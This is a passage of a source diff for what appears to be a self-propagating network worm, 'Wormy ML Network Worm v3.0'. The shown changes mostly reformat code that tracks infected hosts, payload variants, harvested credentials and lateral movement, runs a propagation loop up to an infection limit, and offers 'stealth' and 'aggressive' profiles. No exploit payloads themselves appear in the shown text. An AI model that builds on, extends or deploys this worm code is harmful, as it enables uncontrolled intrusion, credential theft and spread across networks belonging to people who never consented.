+                    f"Payload: {info['payload_variant']:<6} "
+                    f"Creds: {info['credentials_found']:<3} "
+                    f"Lateral: {lmovements}"
+                )
         else:
             print("Host Monitor not available")
 
@@ -1875,7 +2284,7 @@ Wormy ML Network Worm v3.0 - Available Commands:
 
         self.worm.running = True
         self.worm.start_time = datetime.now()
-        self.worm.stats['start_time'] = self.worm.start_time
+        self.worm.stats["start_time"] = self.worm.start_time
 
         local_ip = get_local_ip()
         self.worm.infected_hosts.add(local_ip)
@@ -1913,12 +2322,15 @@ Wormy ML Network Worm v3.0 - Available Commands:
             if self.worm.config.propagation.propagation_delay > 0:
                 time.sleep(self.worm.config.propagation.propagation_delay)
 
-            if len(self.worm.infected_hosts) >= self.worm.config.propagation.max_infections:
+            if (
+                len(self.worm.infected_hosts)
+                >= self.worm.config.propagation.max_infections
+            ):
                 break
 
             self.worm.print_status()
 
-        self.worm.stats['end_time'] = datetime.now()
+        self.worm.stats["end_time"] = datetime.now()
         self.worm.running = False
         self.worm.print_final_report()
 
@@ -1950,6 +2362,7 @@ Wormy ML Network Worm v3.0 - Available Commands:
 def get_local_ip():
     """Get local IP address"""
     import socket
+
     try:
         s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
         s.connect(("8.8.8.8", 80))
@@ -1965,14 +2378,22 @@ def main():
     import argparse
 
     parser = argparse.ArgumentParser(description="Wormy ML Network Worm v3.0")
-    parser.add_argument('--config', type=str, help='Configuration file')
-    parser.add_argument('--scan-only', action='store_true', help='Scan only')
-    parser.add_argument('--kill-switch', type=str, help='Kill switch code')
-    parser.add_argument('--profile', type=str, choices=['stealth', 'aggressive', 'audit'],
-                        help='Configuration profile')
-    parser.add_argument('--dry-run', action='store_true', help='Simulate without real exploits')
-    parser.add_argument('--no-monitor', action='store_true', help='Disable CLI monitor')
-    parser.add_argument('--interactive', '-i', action='store_true', help='Interactive CLI mode')
+    parser.add_argument("--config", type=str, help="Configuration file")
+    parser.add_argument("--scan-only", action="store_true", help="Scan only")
+    parser.add_argument("--kill-switch", type=str, help="Kill switch code")
+    parser.add_argument(
+        "--profile",
+        type=str,
+        choices=["stealth", "aggressive", "audit"],
+        help="Configuration profile",
+    )
+    parser.add_argument(
+        "--dry-run", action="store_true", help="Simulate without real exploits"
+    )
+    parser.add_argument("--no-monitor", action="store_true", help="Disable CLI monitor")
+    parser.add_argument(
+        "--interactive", "-i", action="store_true", help="Interactive CLI mode"
+    )
 
     args = parser.parse_args()
 
